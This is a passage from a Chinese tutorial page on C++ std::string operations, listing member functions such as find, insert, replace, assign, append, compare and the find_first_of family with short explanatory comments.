<span class="n">where</span> <span class="o">=</span> <span class="n">str1</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="n">str2</span><span class="p">,</span><span class="n">pos1</span><span class="p">);</span>  <span class="c1">//pos1是从str1的第几位开始。
</span><span class="c1"></span><span class="n">where</span> <span class="o">=</span> <span class="n">str1</span><span class="p">.</span><span class="n">rfind</span><span class="p">(</span><span class="n">str2</span><span class="p">);</span> <span class="c1">//从后往前搜。
</span></code></pre></td></tr></table>
</div>
</div><ol start="6">
<li>插入字符串
不是赋值语句。</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-cpp" data-lang="cpp"><span class="n">str1</span><span class="p">.</span><span class="n">insert</span><span class="p">(</span><span class="n">pos1</span><span class="p">,</span><span class="n">str2</span><span class="p">);</span>
<span class="n">str1</span><span class="p">.</span><span class="n">insert</span><span class="p">(</span><span class="n">pos1</span><span class="p">,</span><span class="n">str2</span><span class="p">,</span><span class="n">pos2</span><span class="p">,</span><span class="n">len2</span><span class="p">);</span>
<span class="n">str1</span><span class="p">.</span><span class="n">insert</span><span class="p">(</span><span class="n">pos1</span><span class="p">,</span><span class="n">numchar</span><span class="p">,</span><span class="kt">char</span><span class="p">);</span> <span class="c1">//numchar是插入次数，char是要插入的字符。
</span></code></pre></td></tr></table>
</div>
</div><ol start="7">
<li>替换字符串</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-cpp" data-lang="cpp"><span class="n">str1</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="n">pos1</span><span class="p">,</span><span class="n">str2</span><span class="p">);</span>
<span class="n">str1</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="n">pos1</span><span class="p">,</span><span class="n">str2</span><span class="p">,</span><span class="n">pos2</span><span class="p">,</span><span class="n">len2</span><span class="p">);</span>
</code></pre></td></tr></table>
</div>
</div><ol start="8">
<li>删除字符串</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-cpp" data-lang="cpp"><span class="n">str</span><span class="p">.</span><span class="n">erase</span><span class="p">(</span><span class="n">pos</span><span class="p">,</span><span class="n">len</span><span class="p">)</span>
<span class="n">str</span><span class="p">.</span><span class="n">clear</span><span class="p">();</span>
</code></pre></td></tr></table>
</div>
</div><ol start="9">
<li>交换字符串</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-cpp" data-lang="cpp"><span class="n">swap</span><span class="p">(</span><span class="n">str1</span><span class="p">,</span><span class="n">str2</span><span class="p">);</span>
</code></pre></td></tr></table>
</div>
</div><ol start="10">
<li>C &ndash;&gt; C++</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-cpp" data-lang="cpp"><span class="kt">char</span> <span class="o">*</span><span class="n">cstr</span> <span class="o">=</span> <span class="s">&#34;Hello&#34;</span><span class="p">;</span>
<span class="n">string</span> <span class="n">str1</span><span class="p">;</span>
<span class="n">cstr</span> <span class="o">=</span> <span class="n">cstr</span><span class="p">;</span>
<span class="n">string</span> <span class="nf">str2</span><span class="p">(</span><span class="n">cstr</span><span class="p">);</span>
</code></pre></td></tr></table>
</div>
</div><p>对于ACMer来说，C的字符串处理要比C++的方便、简单，尽量用C的字符串处理函数。</p>
<h1 id="c中string类常用算法">C++中string类常用算法</h1>
<h2 id="string类的构造函数">string类的构造函数：</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-cpp" data-lang="cpp"><span class="n">string</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">s</span><span class="p">);</span> <span class="c1">//用c字符串s初始化
</span><span class="c1"></span><span class="n">string</span><span class="p">(</span><span class="kt">int</span> <span class="n">n</span><span class="p">,</span><span class="kt">char</span> <span class="n">c</span><span class="p">);</span> <span class="c1">//用n个字符c初始化
</span></code></pre></td></tr></table>
</div>
</div><p>此外，string类还支持默认构造函数和复制构造函数，如:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-cpp" data-lang="cpp"><span class="n">string</span> <span class="n">s1</span><span class="err">；</span><span class="n">string</span>
<span class="n">s2</span><span class="o">=</span><span class="s">&#34;hello&#34;</span><span class="err">；</span>
</code></pre></td></tr></table>
</div>
</div><p>都是正确的写法。</p>
<p>当构造的string太长而无法表达时会抛出<code>length_error</code>异常</p>
<h2 id="string类的字符操作">string类的字符操作：</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-cpp" data-lang="cpp"><span class="k">const</span> <span class="kt">char</span> <span class="o">&amp;</span><span class="k">operator</span><span class="p">[](</span><span class="kt">int</span> <span class="n">n</span><span class="p">)</span><span class="k">const</span><span class="p">;</span>
<span class="k">const</span> <span class="kt">char</span> <span class="o">&amp;</span><span class="n">at</span><span class="p">(</span><span class="kt">int</span> <span class="n">n</span><span class="p">)</span><span class="k">const</span><span class="p">;</span>
<span class="kt">char</span> <span class="o">&amp;</span><span class="k">operator</span><span class="p">[](</span><span class="kt">int</span> <span class="n">n</span><span class="p">);</span>
<span class="kt">char</span> <span class="o">&amp;</span><span class="n">at</span><span class="p">(</span><span class="kt">int</span> <span class="n">n</span><span class="p">);</span>
<span class="c1">//operator[]和at()均返回当前字符串中第n个字符的位置，但at函数提供范围检查，当越界时会抛出out_of_range异常，下标运算符[]不提供检查访问。
</span><span class="c1"></span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="nf">data</span><span class="p">()</span><span class="k">const</span><span class="p">;</span><span class="c1">//返回一个非null终止的c字符数组
</span><span class="c1"></span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="nf">c_str</span><span class="p">()</span><span class="k">const</span><span class="p">;</span><span class="c1">//返回一个以null终止的c字符串
</span><span class="c1"></span><span class="kt">int</span> <span class="nf">copy</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">s</span><span class="p">,</span> <span class="kt">int</span> <span class="n">n</span><span class="p">,</span> <span class="kt">int</span> <span class="n">pos</span> <span class="o">=</span> <span class="mi">0</span><span class="p">)</span> <span class="k">const</span><span class="p">;</span><span class="c1">//把当前串中以pos开始的n个字符拷贝到以s为起始位置的字符数组中，返回实际拷贝的数目
</span></code></pre></td></tr></table>
</div>
</div><h2 id="string的特性描述">string的特性描述:</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-cpp" data-lang="cpp"><span class="kt">int</span> <span class="nf">capacity</span><span class="p">()</span><span class="k">const</span><span class="p">;</span> <span class="c1">//返回当前容量（即string中不必增加内存即可存放的元素个数）
</span><span class="c1"></span><span class="kt">int</span> <span class="nf">max_size</span><span class="p">()</span><span class="k">const</span><span class="p">;</span> <span class="c1">//返回string对象中可存放的最大字符串的长度
</span><span class="c1"></span><span class="kt">int</span> <span class="nf">size</span><span class="p">()</span><span class="k">const</span><span class="p">;</span><span class="c1">//返回当前字符串的大小
</span><span class="c1"></span><span class="kt">int</span> <span class="nf">length</span><span class="p">()</span><span class="k">const</span><span class="p">;</span> <span class="c1">//返回当前字符串的长度
</span><span class="c1"></span><span class="kt">bool</span> <span class="nf">empty</span><span class="p">()</span><span class="k">const</span><span class="p">;</span><span class="c1">//当前字符串是否为空
</span><span class="c1"></span><span class="kt">void</span> <span class="nf">resize</span><span class="p">(</span><span class="kt">int</span> <span class="n">len</span><span class="p">,</span><span class="kt">char</span> <span class="n">c</span><span class="p">);</span><span class="c1">//把字符串当前大小置为len，并用字符c填充不足的
</span></code></pre></td></tr></table>
</div>
</div><h2 id="部分string类的输入输出操作">部分string类的输入输出操作:</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-cpp" data-lang="cpp"><span class="n">string类重载运算符operator</span><span class="o">&gt;&gt;</span><span class="c1">//用于输入，同样重载运算符operator&lt;&lt;用于输出操作。函数getline(istream &amp;in,string &amp;s);//用于从输入流in中读取字符串到s中，以换行符&#39;\n&#39;分开。
</span></code></pre></td></tr></table>
</div>
</div><h2 id="string的赋值">string的赋值：</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-cpp" data-lang="cpp"><span class="n">string</span> <span class="o">&amp;</span><span class="k">operator</span><span class="o">=</span><span class="p">(</span><span class="k">const</span> <span class="n">string</span> <span class="o">&amp;</span><span class="n">s</span><span class="p">);</span><span class="c1">//把字符串s赋给当前字符串
</span><span class="c1"></span><span class="n">string</span> <span class="o">&amp;</span><span class="n">assign</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">s</span><span class="p">);</span><span class="c1">//用c类型字符串s赋值
</span><span class="c1"></span><span class="n">string</span> <span class="o">&amp;</span><span class="n">assign</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">s</span><span class="p">,</span><span class="kt">int</span> <span class="n">n</span><span class="p">);</span><span class="c1">//用c字符串s开始的n个字符赋值
</span><span class="c1"></span><span class="n">string</span> <span class="o">&amp;</span><span class="n">assign</span><span class="p">(</span><span class="k">const</span> <span class="n">string</span> <span class="o">&amp;</span><span class="n">s</span><span class="p">);</span><span class="c1">//把字符串s赋给当前字符串
</span><span class="c1"></span><span class="n">string</span> <span class="o">&amp;</span><span class="n">assign</span><span class="p">(</span><span class="kt">int</span> <span class="n">n</span><span class="p">,</span><span class="kt">char</span> <span class="n">c</span><span class="p">);</span><span class="c1">//用n个字符c赋值给当前字符串
</span><span class="c1"></span><span class="n">string</span> <span class="o">&amp;</span><span class="n">assign</span><span class="p">(</span><span class="k">const</span> <span class="n">string</span> <span class="o">&amp;</span><span class="n">s</span><span class="p">,</span><span class="kt">int</span> <span class="n">start</span><span class="p">,</span><span class="kt">int</span> <span class="n">n</span><span class="p">);</span><span class="c1">//把字符串s中从start开始的n个字符赋给当前字符串
</span><span class="c1"></span><span class="n">string</span> <span class="o">&amp;</span><span class="n">assign</span><span class="p">(</span><span class="n">const_iterator</span> <span class="n">first</span><span class="p">,</span><span class="n">const_itertor</span> <span class="n">last</span><span class="p">);</span><span class="c1">//把first和last迭代器之间的部分赋给字符串
</span></code></pre></td></tr></table>
</div>
</div><h2 id="string的连接">string的连接：</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-cpp" data-lang="cpp"><span class="c1">//把字符串s连接到当前字符串的结尾
</span><span class="c1"></span><span class="n">string</span> <span class="o">&amp;</span><span class="k">operator</span><span class="o">+=</span><span class="p">(</span><span class="k">const</span> <span class="n">string</span> <span class="o">&amp;</span><span class="n">s</span><span class="p">);</span>

<span class="c1">//把c类型字符串s连接到当前字符串结尾
</span><span class="c1"></span><span class="n">string</span> <span class="o">&amp;</span><span class="n">append</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">s</span><span class="p">);</span>

<span class="c1">//把c类型字符串s的前n个字符连接到当前字符串结尾
</span><span class="c1"></span><span class="n">string</span> <span class="o">&amp;</span><span class="n">append</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">s</span><span class="p">,</span><span class="kt">int</span> <span class="n">n</span><span class="p">);</span>

<span class="c1">//同operator+=()
</span><span class="c1"></span><span class="n">string</span> <span class="o">&amp;</span><span class="n">append</span><span class="p">(</span><span class="k">const</span> <span class="n">string</span> <span class="o">&amp;</span><span class="n">s</span><span class="p">);</span>

<span class="c1">//把字符串s中从pos开始的n个字符连接到当前字符串的结尾
</span><span class="c1"></span><span class="n">string</span> <span class="o">&amp;</span><span class="n">append</span><span class="p">(</span><span class="k">const</span> <span class="n">string</span> <span class="o">&amp;</span><span class="n">s</span><span class="p">,</span><span class="kt">int</span> <span class="n">pos</span><span class="p">,</span><span class="kt">int</span> <span class="n">n</span><span class="p">);</span>

<span class="c1">//在当前字符串结尾添加n个字符c
</span><span class="c1"></span><span class="n">string</span> <span class="o">&amp;</span><span class="n">append</span><span class="p">(</span><span class="kt">int</span> <span class="n">n</span><span class="p">,</span><span class="kt">char</span> <span class="n">c</span><span class="p">);</span>

<span class="c1">//把迭代器first和last之间的部分连接到当前字符串的结尾
</span><span class="c1"></span><span class="n">string</span> <span class="o">&amp;</span><span class="n">append</span><span class="p">(</span><span class="n">const_iterator</span> <span class="n">first</span><span class="p">,</span><span class="n">const_iterator</span> <span class="n">last</span><span class="p">);</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="string的比较">string的比较：</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-cpp" data-lang="cpp"><span class="c1">//比较两个字符串是否相等运算符&#34;&gt;&#34;,&#34;&lt;&#34;,&#34;&gt;=&#34;,&#34;&lt;=&#34;,&#34;!=&#34;均被重载用于字符串的比较；
</span><span class="c1"></span><span class="kt">bool</span> <span class="n">perator</span><span class="o">==</span><span class="p">(</span><span class="k">const</span> <span class="n">string</span> <span class="o">&amp;</span><span class="n">s1</span><span class="p">,</span><span class="k">const</span> <span class="n">string</span> <span class="o">&amp;</span><span class="n">s2</span><span class="p">)</span><span class="k">const</span><span class="p">;</span>

<span class="c1">//比较当前字符串和s的大小
</span><span class="c1"></span><span class="kt">int</span> <span class="nf">compare</span><span class="p">(</span><span class="k">const</span> <span class="n">string</span> <span class="o">&amp;</span><span class="n">s</span><span class="p">)</span> <span class="k">const</span><span class="p">;</span>

<span class="c1">//比较当前字符串从pos开始的n个字符组成的字符串与s的大小
</span><span class="c1"></span><span class="kt">int</span> <span class="nf">compare</span><span class="p">(</span><span class="kt">int</span> <span class="n">pos</span><span class="p">,</span> <span class="kt">int</span> <span class="n">n</span><span class="p">,</span><span class="k">const</span> <span class="n">string</span> <span class="o">&amp;</span><span class="n">s</span><span class="p">)</span><span class="k">const</span><span class="p">;</span>

<span class="c1">//比较当前字符串从pos开始的n个字符组成的字符串与s中pos2开始的n2个字符组成的字符串的大小
</span><span class="c1"></span><span class="kt">int</span> <span class="nf">compare</span><span class="p">(</span><span class="kt">int</span> <span class="n">pos</span><span class="p">,</span> <span class="kt">int</span> <span class="n">n</span><span class="p">,</span><span class="k">const</span> <span class="n">string</span> <span class="o">&amp;</span><span class="n">s</span><span class="p">,</span><span class="kt">int</span> <span class="n">pos2</span><span class="p">,</span><span class="kt">int</span> <span class="n">n2</span><span class="p">)</span><span class="k">const</span><span class="p">;</span>

<span class="kt">int</span> <span class="nf">compare</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">s</span><span class="p">)</span> <span class="k">const</span><span class="p">;</span>

<span class="kt">int</span> <span class="nf">compare</span><span class="p">(</span><span class="kt">int</span> <span class="n">pos</span><span class="p">,</span> <span class="kt">int</span> <span class="n">n</span><span class="p">,</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">s</span><span class="p">)</span> <span class="k">const</span><span class="p">;</span>

<span class="kt">int</span> <span class="nf">compare</span><span class="p">(</span><span class="kt">int</span> <span class="n">pos</span><span class="p">,</span> <span class="kt">int</span> <span class="n">n</span><span class="p">,</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">s</span><span class="p">,</span> <span class="kt">int</span> <span class="n">pos2</span><span class="p">)</span> <span class="k">const</span><span class="p">;</span>

<span class="c1">//compare函数在&gt;时返回1，&lt;时返回-1，==时返回0 
</span></code></pre></td></tr></table>
</div>
</div><h2 id="string的子串">string的子串：</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-cpp" data-lang="cpp"><span class="c1">//返回pos开始的n个字符组成的字符串string的交换：
</span><span class="c1"></span><span class="n">string</span> <span class="nf">substr</span><span class="p">(</span><span class="kt">int</span> <span class="n">pos</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span><span class="kt">int</span> <span class="n">n</span> <span class="o">=</span> <span class="n">npos</span><span class="p">)</span> <span class="k">const</span><span class="p">;</span>

<span class="c1">//交换当前字符串与s2的值
</span><span class="c1"></span><span class="kt">void</span> <span class="nf">swap</span><span class="p">(</span><span class="n">string</span> <span class="o">&amp;</span><span class="n">s2</span><span class="p">);</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="string类的查找函数">string类的查找函数：</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-cpp" data-lang="cpp"><span class="c1">//从pos开始查找字符c在当前字符串的位置
</span><span class="c1"></span><span class="kt">int</span> <span class="nf">find</span><span class="p">(</span><span class="kt">char</span> <span class="n">c</span><span class="p">,</span> <span class="kt">int</span> <span class="n">pos</span> <span class="o">=</span> <span class="mi">0</span><span class="p">)</span> <span class="k">const</span><span class="p">;</span>

<span class="c1">//从pos开始查找字符串s在当前串中的位置
</span><span class="c1"></span><span class="kt">int</span> <span class="nf">find</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">s</span><span class="p">,</span> <span class="kt">int</span> <span class="n">pos</span> <span class="o">=</span> <span class="mi">0</span><span class="p">)</span> <span class="k">const</span><span class="p">;</span>

<span class="c1">//从pos开始查找字符串s中前n个字符在当前串中的位置
</span><span class="c1"></span><span class="kt">int</span> <span class="nf">find</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">s</span><span class="p">,</span> <span class="kt">int</span> <span class="n">pos</span><span class="p">,</span> <span class="kt">int</span> <span class="n">n</span><span class="p">)</span> <span class="k">const</span><span class="p">;</span>

<span class="c1">//从pos开始查找字符串s在当前串中的位置
</span><span class="c1">//查找成功时返回所在位置，失败返回string::npos的值
</span><span class="c1"></span><span class="kt">int</span> <span class="nf">find</span><span class="p">(</span><span class="k">const</span> <span class="n">string</span> <span class="o">&amp;</span><span class="n">s</span><span class="p">,</span> <span class="kt">int</span> <span class="n">pos</span> <span class="o">=</span> <span class="mi">0</span><span class="p">)</span> <span class="k">const</span><span class="p">;</span>

<span class="c1">//从pos开始从后向前查找字符c在当前串中的位置
</span><span class="c1"></span><span class="kt">int</span> <span class="nf">rfind</span><span class="p">(</span><span class="kt">char</span> <span class="n">c</span><span class="p">,</span> <span class="kt">int</span> <span class="n">pos</span> <span class="o">=</span> <span class="n">npos</span><span class="p">)</span> <span class="k">const</span><span class="p">;</span>

<span class="kt">int</span> <span class="nf">rfind</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">s</span><span class="p">,</span> <span class="kt">int</span> <span class="n">pos</span> <span class="o">=</span> <span class="n">npos</span><span class="p">)</span> <span class="k">const</span><span class="p">;</span>

<span class="kt">int</span> <span class="nf">rfind</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">s</span><span class="p">,</span> <span class="kt">int</span> <span class="n">pos</span><span class="p">,</span> <span class="kt">int</span> <span class="n">n</span> <span class="o">=</span> <span class="n">npos</span><span class="p">)</span> <span class="k">const</span><span class="p">;</span>

<span class="kt">int</span> <span class="nf">rfind</span><span class="p">(</span><span class="k">const</span> <span class="n">string</span> <span class="o">&amp;</span><span class="n">s</span><span class="p">,</span><span class="kt">int</span> <span class="n">pos</span> <span class="o">=</span> <span class="n">npos</span><span class="p">)</span> <span class="k">const</span><span class="p">;</span>

<span class="c1">//从pos开始从后向前查找字符串s中前n个字符组成的字符串在当前串中的位置，成功返回所在位置，失败时返回string::npos的值
</span><span class="c1"></span>
<span class="c1">//从pos开始查找字符c第一次出现的位置
</span><span class="c1"></span><span class="kt">int</span> <span class="nf">find_first_of</span><span class="p">(</span><span class="kt">char</span> <span class="n">c</span><span class="p">,</span> <span class="kt">int</span> <span class="n">pos</span> <span class="o">=</span> <span class="mi">0</span><span class="p">)</span> <span class="k">const</span><span class="p">;</span>

<span class="kt">int</span> <span class="nf">find_first_of</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">s</span><span class="p">,</span> <span class="kt">int</span> <span class="n">pos</span> <span class="o">=</span> <span class="mi">0</span><span class="p">)</span> <span class="k">const</span><span class="p">;</span>

<span class="kt">int</span> <span class="nf">find_first_of</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">s</span><span class="p">,</span> <span class="kt">int</span> <span class="n">pos</span><span class="p">,</span> <span class="kt">int</span> <span class="n">n</span><span class="p">)</span> <span class="k">const</span><span class="p">;</span>

<span class="kt">int</span> <span class="nf">find_first_of</span><span class="p">(</span><span class="k">const</span> <span class="n">string</span> <span class="o">&amp;</span><span class="n">s</span><span class="p">,</span><span class="kt">int</span> <span class="n">pos</span> <span class="o">=</span> <span class="mi">0</span><span class="p">)</span> <span class="k">const</span><span class="p">;</span>

<span class="c1">//从pos开始查找当前串中第一个在s的前n个字符组成的数组里的字符的位置。查找失败返回string::npos
</span><span class="c1"></span>
<span class="kt">int</span> <span class="nf">find_first_not_of</span><span class="p">(</span><span class="kt">char</span> <span class="n">c</span><span class="p">,</span> <span class="kt">int</span> <span class="n">pos</span> <span class="o">=</span> <span class="mi">0</span><span class="p">)</span> <span class="k">const</span><span class="p">;</span>

<span class="kt">int</span> <span class="nf">find_first_not_of</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">s</span><span class="p">,</span> <span class="kt">int</span> <span class="n">pos</span> <span class="o">=</span> <span class="mi">0</span><span class="p">)</span> <span class="k">const</span><span class="p">;</span>

<span class="kt">int</span> <span class="nf">find_first_not_of</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">s</span><span class="p">,</span> <span class="kt">int</span> <span class="n">pos</span><span class="p">,</span><span class="kt">int</span> <span class="n">n</span><span class="p">)</span> <span class="k">const</span><span class="p">;</span>

<span class="kt">int</span> <span class="nf">find_first_not_of</span><span class="p">(</span><span class="k">const</span> <span class="n">string</span> <span class="o">&amp;</span><span class="n">s</span><span class="p">,</span><span class="kt">int</span> <span class="n">pos</span> <span class="o">=</span> <span class="mi">0</span><span class="p">)</span> <span class="k">const</span><span class="p">;</span>

<span class="c1">//从当前串中查找第一个不在串s中的字符出现的位置，失败返回string::npos
</span><span class="c1"></span>
<span class="kt">int</span> <span class="nf">find_last_of</span><span class="p">(</span><span class="kt">char</span> <span class="n">c</span><span class="p">,</span> <span class="kt">int</span> <span class="n">pos</span> <span class="o">=</span> <span class="n">npos</span><span class="p">)</span> <span class="k">const</span><span class="p">;</span>

<span class="kt">int</span> <span class="nf">find_last_of</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">s</span><span class="p">,</span> <span class="kt">int</span> <span class="n">pos</span> <span class="o">=</span> <span class="n">npos</span><span class="p">)</span> <span class="k">const</span><span class="p">;</span>

<span class="kt">int</span> <span class="nf">find_last_of</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">s</span><span class="p">,</span> <span class="kt">int</span> <span class="n">pos</span><span class="p">,</span> <span class="kt">int</span> <span class="n">n</span> <span class="o">=</span> <span class="n">npos</span><span class="p">)</span> <span class="k">const</span><span class="p">;</span>

<span class="kt">int</span> <span class="nf">find_last_of</span><span class="p">(</span><span class="k">const</span> <span class="n">string</span> <span class="o">&amp;</span><span class="n">s</span><span class="p">,</span><span class="kt">int</span> <span class="n">pos</span> <span class="o">=</span> <span class="n">npos</span><span class="p">)</span> <span class="k">const</span><span class="p">;</span>

<span class="kt">int</span> <span class="nf">find_last_not_of</span><span class="p">(</span><span class="kt">char</span> <span class="n">c</span><span class="p">,</span> <span class="kt">int</span> <span class="n">pos</span> <span class="o">=</span> <span class="n">npos</span><span class="p">)</span> <span class="k">const</span><span class="p">;</span>

<span class="kt">int</span> <span class="nf">find_last_not_of</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">s</span><span class="p">,</span> <span class="kt">int</span> <span class="n">pos</span> <span class="o">=</span> <span class="n">npos</span><span class="p">)</span> <span class="k">const</span><span class="p">;</span>

<span class="kt">int</span> <span class="nf">find_last_not_of</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">s</span><span class="p">,</span> <span class="kt">int</span> <span class="n">pos</span><span class="p">,</span><span class="kt">int</span> <span class="n">n</span><span class="p">)</span> <span class="k">const</span><span class="p">;</span>

<span class="kt">int</span> <span class="nf">find_last_not_of</span><span class="p">(</span><span class="k">const</span> <span class="n">string</span> <span class="o">&amp;</span><span class="n">s</span><span class="p">,</span><span class="kt">int</span> <span class="n">pos</span> <span class="o">=</span> <span class="n">npos</span><span class="p">)</span> <span class="k">const</span><span class="p">;</span>

<span class="c1">//find_last_of和find_last_not_of与find_first_of和find_first_not_of相似，只不过是从后向前查找
</span></code></pre></td></tr></table>
</div>
</div><h2 id="string类的替换函数">string类的替换函数：</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
